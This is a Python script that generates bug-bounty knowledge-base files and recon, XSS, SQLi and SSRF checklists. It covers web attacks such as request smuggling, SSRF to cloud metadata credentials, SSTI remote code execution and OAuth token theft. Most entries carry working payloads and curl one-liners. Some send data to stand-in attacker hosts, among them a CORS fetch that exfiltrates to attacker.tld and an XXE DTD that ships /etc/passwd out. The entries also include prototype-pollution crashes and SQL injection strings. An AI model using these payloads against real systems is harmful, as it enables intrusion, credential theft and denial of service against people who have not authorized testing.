#!/usr/bin/env python3
"""Generate KNOWLEDGE_BASE + CHECKLISTS + master INDEX/QUICK_REF/DAY1."""
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

def w(rel, content):
    p = ROOT / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    print(f"  {rel} ({len(content)})")

# ═════════════════════════════════════════
# KNOWLEDGE_BASE — micro-topics
# Each follows the spec's template
# ═════════════════════════════════════════
print("=== KNOWLEDGE_BASE ===")

def kb(name, what, find, test, exploit, bypass, tools, payloads, examples, mistakes, severity, refs, oneliners):
    return f"""# {name}

## 📌 What It Is
{what}

## 🔍 How to Find It
{find}

## 🧪 How to Test It
{test}

## 💣 How to Exploit It
{exploit}

## 🔄 Bypass Techniques
{bypass}

## 🛠️ Tools
{tools}

## 🎯 Payloads
{payloads}

## 📝 Real-World Examples
{examples}

## 🚩 Common Mistakes / Traps
{mistakes}

## 📊 Severity & Impact
{severity}

## 🔗 References
{refs}

## ⚡ One-Liners
{oneliners}
"""

# Pre-built KB entries
kb_entries = [
    ("HTTP Request Smuggling (CL.TE)",
     "Frontend uses Content-Length, backend uses Transfer-Encoding (or vice versa). Misalignment lets an attacker prepend a request to the next user's connection.",
     "Probe with timing differential: send `Transfer-Encoding: chunked` + body that ends early — if response delays, backend used TE. Alternatively send `Content-Length: 4`, body `1\\r\\n...`. Use HTTP Request Smuggler ext (Burp).",
     "1. Send probe (CL.TE or TE.CL) → measure timing.\\n2. If delay >5s → confirmed.\\n3. Test for cross-user impact: prepend request that affects next request on connection.",
     "Smuggled request → admin endpoint → cache poisoning → ATO. Bypass auth via internal headers (X-Forwarded-User: admin) injected by smuggling.",
     "- Use TE: chunked\\nfoo\\nbar (variant TE values, like `Transfer-Encoding: \\tchunked`, `Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity`)\\n- HTTP/2 → H1 downgrade smuggling\\n- HTTP/2 CRLF in pseudo-headers",
     "- Burp HTTP Request Smuggler\\n- smuggler.py (defparam)\\n- nuclei smuggling templates",
     "```\\nPOST / HTTP/1.1\\nHost: target\\nContent-Length: 4\\nTransfer-Encoding: chunked\\n\\n1\\nA\\nQ\\n```",
     "PortSwigger James Kettle research; CVE-2019-XXX (CDN smuggling).",
     "Don't rely on intermittent delays; confirm with cross-user smuggle. Don't smuggle destructive requests in production.",
     "Critical (CVSS 9.0+) when admin compromise possible.",
     "PortSwigger HTTP Request Smuggling, James Kettle DEF CON 27 talk.",
     "```bash\\necho 'https://target' | nuclei -t ~/nuclei-templates/http/smuggling/\\n```"),

    ("Web Cache Deception",
     "Serving private (authenticated) content from a CDN cache that thinks the URL is static. Attacker tricks user into requesting URL like `/account/myinfo.css`; cache stores response as static .css; attacker fetches same URL anonymously.",
     "Look for path-based cache. Test by requesting `/account.css` (or similar variation). If 200 with sensitive data → cached.",
     "1. Logged in, GET `/account/myinfo`\\n2. Logged in, GET `/account/myinfo.css` → if returns same private content → cacheable\\n3. Open incognito, GET `/account/myinfo.css` → if returns first user's data → confirmed.",
     "1. Send victim crafted link `/profile/me.css?victim=user`\\n2. Cache stores victim's profile\\n3. Attacker fetches same URL → reads victim profile.",
     "Test: .css, .js, .jpg, .png, .ico, .pdf, .woff, .map, .json (cache rules vary). Test trailing slash. Test path traversal `/account/me/../style.css`.",
     "- Burp Param Miner\\n- Nuclei cache deception template",
     "```\\nGET /account/myprofile/x.css HTTP/1.1\\n```",
     "Omer Gil's original disclosure (PayPal). Acquia, BunnyCDN, Cloudflare cases.",
     "Don't confuse with cache poisoning. Don't test destructively (destruct cached entries).",
     "High (CVSS 7-8) for PII leak; Critical for tokens.",
     "Omer Gil DEF CON, PortSwigger labs.",
     "```bash\\nfor ext in css js jpg png; do curl -sI \"https://target/account/x.$ext\" | grep -i 'x-cache\\|cf-cache\\|age:'; done\\n```"),

    ("Server-Side Request Forgery — IMDS",
     "SSRF that reaches the cloud instance metadata service (169.254.169.254) and reads IAM credentials.",
     "Find any URL/host parameter that the server fetches. Try `http://169.254.169.254/latest/meta-data/`.",
     "Inject into image-fetch, webhook, URL preview, profile picture URL, OAuth callback fetcher.",
     "1. Probe with `http://169.254.169.254/latest/meta-data/` → list of metadata keys.\\n2. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → role name.\\n3. `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → AccessKeyId/SecretAccessKey/Token.\\n4. `aws sts get-caller-identity` with creds → confirm.",
     "IMDSv2: requires PUT to /latest/api/token first with TTL header. If only IMDSv2 enabled, SSRF must support PUT or send custom headers. Try `gopher://169.254.169.254/...`.\\nGCP needs `Metadata-Flavor: Google` header. Azure needs `Metadata: true` header.",
     "- ssrfmap, gopherus, interactsh-client",
     "See PAYLOADS/ssrf_payloads_bypasses.md",
     "Capital One 2019 (S3 + IAM). Microsoft Azure SSRF (multiple). HackerOne reports #h1-XXX.",
     "Don't pivot beyond IAM read. Don't list S3 buckets you weren't authorized for.",
     "Critical (CVSS 9.8). Cloud account takeover.",
     "AWS IMDSv2 docs, Capital One incident report.",
     "```bash\\ncurl 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\\n```"),

    ("OAuth — redirect_uri Misconfiguration",
     "Authorization servers accept arbitrary or partial-match redirect_uri values, leaking authorization codes or tokens to attacker.",
     "Find OAuth flow (look for `/oauth/authorize`, `client_id`, `redirect_uri`). Try modifying redirect_uri to attacker domain or attacker-controlled subdomain of allowed.",
     "1. Initiate flow with `redirect_uri=https://allowed.tld@attacker.tld`\\n2. With `redirect_uri=https://allowed.tld.attacker.tld`\\n3. With `redirect_uri=https://attacker.tld#allowed.tld`\\n4. With path bypass `redirect_uri=https://allowed.tld/callback/../../attacker.tld`",
     "If allowed → you receive `code` or `token` → exchange for access token → ATO of victim account.",
     "URL parser confusion: backslash, `@`, `#`, `?`, double-encoding. Subdomain takeover on `forgotten.allowed.tld`. Open redirect chain in callback path.",
     "- Burp + manual fuzz\\n- ssrf-king (postauth)\\n- nuclei oauth templates",
     "```\\nGET /oauth/authorize?client_id=X&redirect_uri=https://attacker.tld&response_type=code&state=...\\n```",
     "Salt Labs OAuth research, multiple Apple/Google/Facebook H1 reports.",
     "Don't conflate with CSRF in OAuth — different vector. Validate `state` is bound to session.",
     "Critical (8-10) for ATO.",
     "RFC 6749, oauth.net, Daniel Fett's OAuth security research.",
     "```bash\\ncurl -i 'https://target/oauth/authorize?client_id=X&redirect_uri=https://attacker.tld&response_type=code'\\n```"),

    ("JWT — alg:none",
     "JWT library accepts `alg: none` header, allowing token forgery without secret.",
     "Decode the JWT. If the server parses `alg` from the header dynamically → vulnerable.",
     "Forge a token with `alg:none` header, modify payload, drop signature.",
     "Modify `sub`/`role` in payload → submit forged token → access admin.",
     "Case variants: `none`, `None`, `NONE`, `nOnE`, `none ` (trailing space).",
     "- jwt_tool, jwt.io, custom Python with PyJWT",
     "```\\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.\\n```",
     "Auth0 advisory 2015, multiple H1 reports.",
     "Don't forget to remove signature entirely (or include trailing dot).",
     "Critical (CVSS 9.8) when full ATO.",
     "PortSwigger JWT labs, jwt_tool wiki.",
     "```bash\\npython3 -c \"import jwt; print(jwt.encode({'sub':'admin'}, key='', algorithm='none'))\"\\n```"),

    ("CORS — Origin Reflection",
     "`Access-Control-Allow-Origin` reflects the request `Origin` header. If `Allow-Credentials: true`, attacker can read authenticated responses cross-origin.",
     "Send `Origin: https://attacker.tld`. If response has `Access-Control-Allow-Origin: https://attacker.tld` AND `Access-Control-Allow-Credentials: true` → vulnerable.",
     "1. Set Origin header to evil domain\\n2. Check ACAO and ACAC headers\\n3. Try `null` origin (from sandboxed iframe / data: URL)\\n4. Try suffix bypass: `attacker.tld.allowed.com`\\n5. Try prefix: `allowed.com.attacker.tld`",
     "On attacker page: `fetch('https://target/api/me', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.tld/?d='+btoa(d)))`",
     "Tricks: Origin from sandboxed iframe = `null`; Origin parser confusion via path/scheme.",
     "- CORS Scanner (cors-misconfig)\\n- Burp manual\\n- nuclei cors templates",
     "```\\nGET /api/me HTTP/1.1\\nOrigin: https://attacker.tld\\n```",
     "James Kettle's CORS research, multiple H1 reports for SaaS providers.",
     "Don't report CORS without ACAC:true unless cross-origin reads sensitive data without creds.",
     "High (CVSS 7-8) for PII leak.",
     "PortSwigger CORS, MDN CORS spec.",
     "```bash\\ncurl -sI -H 'Origin: https://evil.tld' https://target/api/me | grep -i 'access-control'\\n```"),

    ("XXE — Blind OOB Exfiltration",
     "Server parses XML with external entities; output not reflected. Use external DTD to exfil files via DNS/HTTP to attacker server.",
     "Try classic XXE first (file:///etc/passwd). If response doesn't reflect → blind. Probe with OOB.",
     "1. Host DTD on attacker server: `<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>\">%eval;%exfil;`\\n2. Submit XML referencing external DTD.\\n3. Watch attacker logs for inbound request with file content in URL.",
     "Read sensitive files (`/etc/shadow`, `~/.ssh/id_rsa`, `/proc/self/environ`). Chain to SSRF via XXE.",
     "If outbound HTTP blocked → use DNS exfil with TXT records. Or error-based: `<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>`.",
     "- Burp Collaborator\\n- interactsh-client\\n- xxeserver.py (custom)",
     "See PAYLOADS/xxe_payloads.md.",
     "Apache Solr CVE-2017-12629, GitLab CVE-2018-XXX.",
     "Don't request files >1MB via DNS — too slow. Don't include null bytes in entity values.",
     "High to Critical (8-10) — file read = secrets compromise.",
     "OWASP XXE, PortSwigger XXE labs.",
     "```bash\\ncat payload.xml | curl -X POST --data-binary @- 'https://target/upload' -H 'Content-Type: application/xml'\\n```"),

    ("SSTI — Jinja2 RCE",
     "User-controlled input rendered through Jinja2 (`render_template_string`, eval, custom). Achieves RCE via gadget chain in template context.",
     "Probe `{{7*7}}` → if returns 49, possibly Jinja2/Twig. Probe `{{7*'7'}}` → returns `7777777` = Jinja2.",
     "1. Confirm engine\\n2. Find code-exec gadget (most reliable):\\n   `{{lipsum.__globals__.os.popen('id').read()}}`\\n3. Adapt to filtered context.",
     "Read /etc/passwd, environment, then drop reverse shell.",
     "Filter `__class__` → use `attr('\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f')`.\\nFilter `os` → use `cycler.__init__.__globals__.os` or `lipsum.__globals__['os']`.\\nFilter `()` → use `|attr` chain (in older Jinja).\\nFilter `.` → use `[]`.",
     "- tplmap\\n- SSTImap\\n- Burp Param Miner SSTI extensions",
     "See PAYLOADS/ssti_payloads_all_engines.md (Jinja2 section).",
     "Flask Vulnerable lab, multiple H1 reports.",
     "Don't blindly try {{7*7}} on every endpoint — narrow to template-rendering inputs (email body, profile bio, error message customization).",
     "Critical (CVSS 9.8) — RCE.",
     "PortSwigger SSTI labs, payloadbox/ssti.",
     "```bash\\ncurl 'https://target/?name={{7*7}}'\\n```"),

    ("Subdomain Takeover — S3",
     "DNS CNAME pointing to a non-existent S3 bucket. Attacker registers the bucket and serves arbitrary content on the subdomain.",
     "Enumerate subdomains. Check for CNAME → `*.s3.amazonaws.com`. If bucket returns NoSuchBucket → claimable.",
     "1. `dig CNAME forgotten.target.tld` → `forgotten.target-bucket.s3.amazonaws.com`\\n2. `curl https://forgotten.target.tld` → S3 NoSuchBucket error\\n3. `aws s3 mb s3://forgotten.target-bucket --region us-east-1` → claim.",
     "Serve attacker HTML/JS on subdomain → cookies scoped to `*.target.tld` are exfiltrated. ATO.",
     "Region matters — try other regions if first fails. Some S3 names already taken — try with -1, -2 suffix.",
     "- subzy, nuclei takeovers, can-i-take-over-xyz repo",
     "Direct registration, no payload.",
     "Microsoft, GitHub, Heroku, Shopify takeovers.",
     "Don't host malicious content; just put a benign placeholder + report.",
     "High to Critical (cookie scope = ATO).",
     "github.com/EdOverflow/can-i-take-over-xyz, Detectify research.",
     "```bash\\nsubzy run --targets subs.txt --hide_fails --concurrency 100\\n```"),

    ("Race Condition — single-packet attack",
     "Server processes concurrent requests in parallel; state-checks not atomic. Multiple requests succeed where one should.",
     "Find state-changing endpoint with check (e.g., redeem coupon, withdraw funds, accept invitation). Try sending N concurrent.",
     "1. Use Burp Turbo Intruder `race-single-packet-attack.py`.\\n2. Or Python httpx HTTP/2 with `asyncio.gather`.\\n3. 20-30 concurrent requests via single TCP.\\n4. If multiple 200s where logically only one expected → race confirmed.",
     "Redeem $50 gift card 30 times → $1500 credit. Accept invitation → invite + admin role twice.",
     "If JS framework rate-limits client-side → use direct API. If IP-based → use multiple X-Forwarded-For (if accepted).",
     "- Burp Turbo Intruder\\n- httpx async (Python)\\n- racepwn",
     "Single-packet attack via HTTP/2: 20-30 requests in 1 TCP packet → ~1ms apart.",
     "James Kettle's research at PortSwigger, HackerOne race reports (Shopify, Slack).",
     "Don't run thousands of races on production — drains program treasury. Stop at smallest reliable PoC.",
     "Critical for monetary impact; High for privilege escalation.",
     "PortSwigger Race Conditions Labs (James Kettle 2023).",
     "```python\\nasyncio.gather(*[client.post(url, json={'code':'X'}) for _ in range(30)])\\n```"),

    ("Prototype Pollution — Server-Side RCE",
     "JS object property modified via __proto__ / constructor.prototype. Pollution leaks into every object; downstream gadget triggers RCE.",
     "Find merge/extend/clone/path-set sink (lodash _.merge, jQuery $.extend, mongoose, util.assign). Submit `{\"__proto__\":{\"x\":1}}`. Probe `{}.x` after.",
     "1. Identify pollution: `?__proto__[admin]=true` or JSON body.\\n2. Probe `{}.admin` post-pollution.\\n3. Find gadget — Express render options, child_process spawn options, JSONPath, etc.\\n4. Pollute that gadget → RCE.",
     "Server: pollute `process.mainModule.require('child_process').exec`-adjacent property → RCE on next request handling.",
     "If `__proto__` filtered → use `constructor.prototype`. If JSON.parse strips → use querystring.",
     "- ppmap, ppfuzz, pp-finder\\n- Burp DOM Invader",
     "See PAYLOADS/prototype_pollution_payloads.md",
     "PortSwigger 2022 PP research, hapi.js / fastify / nuxt CVEs.",
     "Don't confuse client-side (XSS) and server-side (RCE) PP — different gadgets.",
     "Critical (CVSS 9.8) for RCE.",
     "PortSwigger PP server-side research, BlackHat 2018 (Olivier Arteau).",
     "```bash\\ncurl 'https://target/api?__proto__[admin]=true'\\n```"),

    ("OAuth — state parameter missing",
     "Authorization server doesn't validate `state`, enabling CSRF on the OAuth flow → forced linking attacker's social account to victim's.",
     "Initiate flow without state param. If completion succeeds → not validated.",
     "1. Attacker initiates OAuth flow on target as themselves\\n2. Captures `?code=...` callback URL\\n3. Sends victim crafted callback URL\\n4. Victim is now linked to attacker's social account → attacker logs in as victim.",
     "ATO via login-with-google: victim's account now controlled by attacker's google account.",
     "If state validated only at endpoint level — try removing entirely. If random — bind to session check.",
     "- Burp manual\\n- Nuclei OAuth misconfig",
     "Capture callback URL, send to victim.",
     "GitHub, Slack, multiple H1 reports.",
     "Don't confuse with redirect_uri abuse — different control.",
     "High (CVSS 7-8).",
     "RFC 6749 §10.12, Daniel Fett OAuth research.",
     "```\\nGET /oauth/callback?code=ATTACKER_CODE\\n```"),

    ("Mass Assignment — JSON",
     "API endpoint binds request body to model directly without field allow-list. Attacker adds extra field (`isAdmin`, `verified`, `balance`) and gets it persisted.",
     "Look for PUT/POST/PATCH endpoints that update objects. Inspect response when fetching the same object — note all fields.",
     "1. Submit normal request body\\n2. Add extra fields: `isAdmin`, `role:admin`, `verified:true`, `balance:99999`\\n3. Refetch object → check if persisted.",
     "User → admin role. Free tier → paid tier. Verified status, etc.",
     "If `isAdmin` filtered → try `is_admin`, `admin`, `roles[]`. If at JSON top level filtered → try nested `{user:{isAdmin:true}}`.",
     "- Burp Param Miner\\n- ParamSpider\\n- Custom mass-assign fuzzer",
     "```json\\n{\"name\":\"foo\",\"email\":\"a@b\",\"isAdmin\":true,\"role\":\"admin\",\"balance\":999999}\\n```",
     "GitHub Rails 2012 (`is_admin`), Bitcoin exchange ATO.",
     "Don't confuse with prototype pollution. Make sure the field actually persists (refetch after).",
     "Critical when admin escalation; High for free→paid.",
     "OWASP Mass Assignment cheat sheet.",
     "```bash\\ncurl -X PUT https://target/api/me -d '{\"name\":\"a\",\"isAdmin\":true}' -H 'Content-Type: application/json'\\n```"),

    ("GraphQL — Introspection Enabled",
     "Production GraphQL endpoint allows introspection query, leaking entire schema (types, queries, mutations, args).",
     "POST `{__schema{types{name,fields{name,type{name}}}}}` to `/graphql`.",
     "Run full introspection query → dump schema → discover hidden mutations / queries.",
     "Hidden admin mutations, deletion ops, batched queries → access control bugs.",
     "If introspection disabled → clairvoyance to recover via error messages.",
     "- graphql-voyager (visual)\\n- inql (Burp)\\n- clairvoyance\\n- graphql-cop\\n- altair, GraphQL Playground",
     "See SKILL_FILES/VULNERABILITIES/API/graphql_introspection_attacks.md",
     "HackerOne, Shopify, GitHub all had GraphQL bugs.",
     "Introspection enabled isn't the bug — it's a starting point. Find auth/authz issues in revealed mutations.",
     "Low alone; Critical when chained with revealed admin mutations.",
     "GraphQL spec, PortSwigger GraphQL labs.",
     "```bash\\ncurl -X POST 'https://target/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'\\n```"),

    ("Cache Poisoning via Header",
     "CDN/cache stores response keyed on URL only; an unkeyed header (X-Forwarded-Host, X-Original-URL, etc.) influences response. Attacker poisons cache for all users.",
     "Probe with Param Miner: send unique `X-Forwarded-Host: attacker.tld` header → see if reflected in cached response.",
     "1. Find unkeyed header that influences output\\n2. Inject XSS / redirect via that header\\n3. Wait for cache to serve next user",
     "Mass XSS to all visitors. Mass redirect. Persistent injection of attacker JS.",
     "If header sanitized — try variations: `X-Original-URL`, `X-Forwarded-Scheme`, `X-Host`, `Forwarded`, `X-Forwarded-Proto`.",
     "- Burp Param Miner\\n- web-cache-poisoning research",
     "```\\nGET /home HTTP/1.1\\nHost: target.tld\\nX-Forwarded-Host: attacker.tld\\n```",
     "James Kettle's 2018-2020 cache poisoning research.",
     "Don't poison production; use unique cache buster `?cb=<random>` to test.",
     "Critical for stored XSS via cache.",
     "PortSwigger cache poisoning labs.",
     "```bash\\ncurl -H 'X-Forwarded-Host: evil.tld' 'https://target/'\\n```"),

    ("Account Takeover via Email Change",
     "Email change endpoint vulnerable to CSRF or IDOR. Attacker changes victim's email → password reset → ATO.",
     "Find email-change endpoint. Test for: CSRF, IDOR (change other user's email), missing re-auth, missing confirmation.",
     "1. CSRF: craft auto-submit form to `/api/email/change?email=attacker`\\n2. IDOR: PUT `/api/users/<victim>/email`\\n3. No confirmation: change goes through immediately without verification email.",
     "→ trigger password reset → reset link to attacker email → ATO.",
     "If confirmation required — race the confirmation. Or chain XSS to autosubmit. Or use Open Redirect to leak confirmation token.",
     "- Burp Repeater\\n- Custom Python script",
     "Auto-submit form (see PAYLOADS/csrf_payloads.md).",
     "Multiple H1 P1 reports — Shopify, Twitter, etc.",
     "Trickiest variant: email change requires current password — but if change happens via OAuth-linked account that doesn't require password, bypass.",
     "Critical (CVSS 9.x).",
     "OWASP ATO cheat sheet.",
     "```bash\\ncurl -X POST 'https://target/api/email/change' -H 'Cookie: ...' -d '[email protected]'\\n```"),

    ("Stored XSS in PDF / SVG / DOC Render",
     "Application accepts user-uploaded PDF/SVG and renders inline; or generates PDF server-side from user HTML. JS executes when victim views.",
     "Upload SVG containing `<script>alert(1)</script>` → if rendered inline (not as image), executes.\\nFor PDF generation: inject HTML/JS into fields rendered with wkhtmltopdf, weasyprint, etc.",
     "1. Try SVG with embedded JS\\n2. Try PDF with `<script>` (Acrobat-supported)\\n3. For server-side rendering: inject `<iframe src=file:///etc/passwd>` (LFI) or `<script>fetch('http://internal/api')</script>` (SSRF)",
     "When server renders user HTML to PDF using browser engine, injected JS runs in server context → SSRF / LFI / token exfil.",
     "Bypasses: Content-Type tampering (`image/svg+xml` vs `text/xml`), filename extension trick (`.png.svg`).",
     "- Burp Upload Scanner\\n- exiftool to embed metadata\\n- custom SVG/PDF templates",
     "```svg\\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"></svg>\\n```",
     "Multiple Shopify, Salesforce, Snapchat reports.",
     "Don't confuse SVG XSS with stored XSS in profile bio. Server-side PDF render via Chrome → very different attack model.",
     "High to Critical (server-side context = SSRF/LFI).",
     "PortSwigger XSS in upload labs.",
     "```bash\\ncurl -F 'file=@evil.svg' https://target/upload\\n```"),

    ("LFI — PHP Filter Chain",
     "PHP `php://filter` wrapper used to read source code of PHP files (which are normally executed, not displayed) by base64-encoding them via filter chain.",
     "If LFI works on PHP file but executes (no readable output) → use `php://filter/convert.base64-encode/resource=index.php`. Decode base64 → source.",
     "1. `?file=php://filter/convert.base64-encode/resource=config.php`\\n2. Base64-decode response → see source.\\n3. Find DB credentials, secret keys, etc.\\n4. Chain UTF-8/UTF-16 iconv filters to RCE (newer technique).",
     "Reach RCE: chain `convert.iconv` filters to produce arbitrary bytes → call as `data://text/plain;base64,<bytes>` → execute.",
     "If base64 stripped → try other filters: `string.rot13`, `convert.iconv.UTF-8.UTF-16LE`, `zlib.deflate`.",
     "- php_filter_chain_generator (synacktiv)",
     "```\\n?file=php://filter/convert.base64-encode/resource=/etc/passwd\\n?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php\\n```",
     "Synacktiv's filter-chain RCE research, multiple CTF / bug bounty.",
     "Filter chain RCE only works in specific PHP versions and config; test on staging first.",
     "Critical (RCE).",
     "Synacktiv blog, OffSec PHP filter abuse.",
     "```bash\\ncurl 'https://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d\\n```"),

    ("Server-Side Template Injection — Twig PHP",
     "Twig template engine used in Symfony apps; user input rendered via `{{ }}` reaches sandbox. Achieves RCE via `_self` or filter functions.",
     "Probe `{{7*7}}` returns 49. Probe `{{ ['id']|filter('system') }}` returns `id` output if RCE.",
     "1. Confirm engine via output\\n2. RCE payload: `{{['id']|map('system')|join}}`\\n3. Read /etc/passwd: `{{['cat /etc/passwd']|map('system')|join}}`",
     "Read sensitive files, drop reverse shell.",
     "If `system` filtered → try `passthru`, `exec`, `shell_exec`, `popen`. If sandbox enabled → exploit `_self.env.registerUndefinedFilterCallback` (Twig <2.4.4).",
     "- tplmap, SSTImap",
     "See PAYLOADS/ssti_payloads_all_engines.md (Twig).",
     "Multiple Symfony / Drupal / WordPress plugin RCEs.",
     "Don't confuse Twig with Jinja2 — same `{{ }}` syntax, different gadgets.",
     "Critical.",
     "Twig docs, PortSwigger SSTI labs.",
     "```bash\\ncurl 'https://target/?n={{[%22id%22]|map(%22system%22)|join}}'\\n```"),

    ("HTTP Parameter Pollution",
     "Multiple parameters with same name handled differently by frontend vs backend (or different backends). Last-wins, first-wins, concat — divergence enables filter bypass.",
     "Test: `?id=1&id=2`. Observe which value the server uses.",
     "1. Map parser behavior per endpoint.\\n2. If WAF processes first occurrence and backend processes last → smuggle malicious value as second.\\n3. Bypass authorization checks: `?role=user&role=admin`.",
     "Bypass WAF by hiding payload in second occurrence. Bypass auth by overriding role.",
     "Path/method inconsistencies. JSON arrays handled as scalars in some parsers.",
     "- Burp manual + Param Miner",
     "```\\n?id=1&id=' OR 1=1-- -\\n?role=user&role=admin\\n```",
     "OWASP HPP cheat sheet, real-world WAF bypasses (Akamai, Cloudflare).",
     "Don't assume HPP works — test each parser. Some normalize early.",
     "Variable, depends on chained impact.",
     "OWASP HPP, Sec-1 HPP research.",
     "```bash\\ncurl 'https://target/?id=1&id=2'\\n```"),

    ("Server-Side Prototype Pollution → DoS",
     "Pollute Node global object with malformed value → crashes downstream operations across all users.",
     "Find PP sink. Pollute with `{__proto__:{toString:null}}`.",
     "Subsequent JSON.stringify or template render crashes server.",
     "Server crash = DoS for all users until restart.",
     "If server isolates per-request — only requests within same Node process affected.",
     "- ppfuzz, custom Burp matchers",
     "```json\\n{\"__proto__\":{\"toString\":null}}\\n```",
     "Multiple npm package CVEs.",
     "Don't run on production — actually crashes the server. Use staging.",
     "Medium-High (DoS).",
     "PortSwigger PP, Snyk advisories.",
     "```bash\\ncurl -X POST -d '{\"__proto__\":{\"toString\":null}}' -H 'Content-Type: application/json' https://target/api/x\\n```"),
]

for entry in kb_entries:
    name = entry[0]
    fname = name.lower().replace(' ', '_').replace('—', '').replace('--', '_').replace('/', '_').replace(':','').replace(',','').replace('(','').replace(')','').replace('->','to').replace('→','to').strip('_')
    while '__' in fname: fname = fname.replace('__','_')
    fname += '.md'
    w(f"KNOWLEDGE_BASE/{fname}", kb(*entry))

# ═════════════════════════════════════════
# CHECKLISTS
# ═════════════════════════════════════════
print("=== CHECKLISTS ===")

checklists = {
"recon_passive.md": r"""# Checklist: Passive Recon
- [ ] crt.sh / certspotter for SAN harvesting
- [ ] subfinder, assetfinder, amass enum -passive
- [ ] chaos-client (ProjectDiscovery)
- [ ] github-subdomains, github-search dorks
- [ ] gau / waybackurls / hakrawler historical URLs
- [ ] Shodan / Censys / FOFA per ASN, org, hostname pattern
- [ ] DNSDB historical records
- [ ] Wayback machine for old endpoints, .git, .env disclosures
- [ ] Cloud bucket enum (cloud_enum, GrayhatWarfare)
- [ ] BGP / ASN enum (whois, asnlookup, hurricane electric)
- [ ] WHOIS reverse lookups (registrant org)
- [ ] ZoomEye for IoT / weird services
- [ ] DNSdumpster for visualization
- [ ] securitytrails for historical data
- [ ] OSINT: LinkedIn for tech stack, employees → email format
- [ ] Stack Overflow for company-specific questions exposing internals
- [ ] Pastebin / GitHub gist for leaks
- [ ] Trello, JIRA, Confluence public pages (often misconfigured)
""",

"recon_active.md": r"""# Checklist: Active Recon
- [ ] alterx / gotator for permutations on known subdomains
- [ ] puredns brute with massive wordlist (n0kovo's, jhaddix all.txt)
- [ ] dnsx for resolving + record types (A, AAAA, CNAME, MX, NS, TXT, SOA)
- [ ] httpx for alive enumeration (status, title, tech-detect, ip)
- [ ] naabu / masscan / nmap for port scan (top 1000 + custom)
- [ ] nmap -sC -sV -p- on alive hosts (full scan)
- [ ] gowitness / aquatone for visual recon
- [ ] katana / hakrawler for crawl + endpoint extraction
- [ ] LinkFinder / xnLinkFinder for endpoints in JS
- [ ] ffuf / dirsearch / feroxbuster for content discovery
- [ ] arjun / paramspider / x8 for hidden parameters
- [ ] gau + qsreplace + nuclei for fuzz pipeline
- [ ] WAF detection (wafw00f) — pick payload class accordingly
- [ ] Tech fingerprint (Wappalyzer / httpx -tech-detect / WhatWeb)
- [ ] Test default creds on admin paths (admin/admin, root/root)
- [ ] Subdomain takeover scan (subzy / nuclei takeovers)
- [ ] Cloud asset enum (S3, GCS, Azure Blobs)
- [ ] Mobile API scan if app target
""",

"xss.md": r"""# Checklist: XSS
- [ ] Test every input that reaches HTML output (search, profile, comment, email body, error message customization)
- [ ] Categorize by context: HTML body, attribute, JS string, URL, SVG
- [ ] Identify reflection point exactly (View page source; trace which character is encoded)
- [ ] Try minimal payload first (`<svg/onload=alert(1)>`)
- [ ] Test for stored XSS — payload persists across page reload
- [ ] Test for DOM XSS — sources/sinks via DOM Invader (Burp built-in)
- [ ] Test for mXSS — DOMPurify mutation bypass
- [ ] Test in admin-visible context (support tickets, audit logs, admin dashboards)
- [ ] Test in email body (HTML email render)
- [ ] Test in PDF / DOCX render (server-side)
- [ ] Test in SVG upload (rendered inline)
- [ ] Test in Markdown render
- [ ] Test in CSV (CSV injection)
- [ ] Test in postMessage handler
- [ ] Test in URL parameter rendered as href / src
- [ ] Verify CSP blocks payloads — find bypass if so
- [ ] Show impact: cookie steal → ATO, internal API call, exfil PII
- [ ] Don't use alert(1) in PoC — use alert(document.domain)
""",

"sqli.md": r"""# Checklist: SQLi
- [ ] Test every parameter that lands in SQL (id, search, sort, filter)
- [ ] Inject `'`, `"`, `\`, `';`, `'/*` → look for SQL errors / 500
- [ ] Boolean diff: `' AND '1'='1` vs `' AND '1'='2`
- [ ] Time-based: `' OR pg_sleep(5)-- -`, `' AND IF(1=1,SLEEP(5),0)-- -`
- [ ] Error-based: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- [ ] Union-based: find # columns via ORDER BY, then UNION SELECT NULL...
- [ ] Stacked queries: `; SELECT pg_sleep(5)-- -` (Postgres / MSSQL)
- [ ] Out-of-band: DNS exfil via `xp_dirtree` (MSSQL), `LOAD_FILE` (MySQL)
- [ ] Headers (X-Forwarded-For, User-Agent, Referer, Cookie)
- [ ] JSON body fields (incl. nested)
- [ ] GraphQL string args
- [ ] NoSQL: `{"$ne":null}`, `{"$gt":""}`, `{"$where":"..."}`
- [ ] Run sqlmap with full args (`--level=3 --risk=2 --random-agent --batch --tamper=...`)
- [ ] If second-order — test where input is later used (admin search, audit log)
- [ ] Confirm exploitability: read DB version, current_user, schema
- [ ] Show full impact (extract user/password hash, then attempt crack offline)
""",

"ssrf.md": r"""# Checklist: SSRF
- [ ] Find URL/host/redirect parameters
- [ ] Image-fetch endpoints, webhooks, URL preview, OAuth callbacks
- [ ] Try internal IPs: 127.0.0.1, 169.254.169.254, 10.0.0.1
- [ ] Try cloud metadata endpoints (AWS / GCP / Azure / Alibaba)
- [ ] Try IP encoding bypasses (octal, decimal, hex, IPv6 mapped)
- [ ] Try URL parser confusion (@, #, \\\\, %)
- [ ] Try alternative schemes (file://, gopher://, dict://, ldap://, ftp://)
- [ ] DNS rebinding (rbndr.us, lock.cmpxchg8b.com)
- [ ] Test for blind SSRF (interactsh, webhook.site, dnslog.cn)
- [ ] If hits IMDS → curl IAM creds → `aws sts get-caller-identity`
- [ ] If hits internal Redis → gopher payload for RCE
- [ ] If hits internal HTTP service → screenshot admin panels
- [ ] Test all HTTP methods
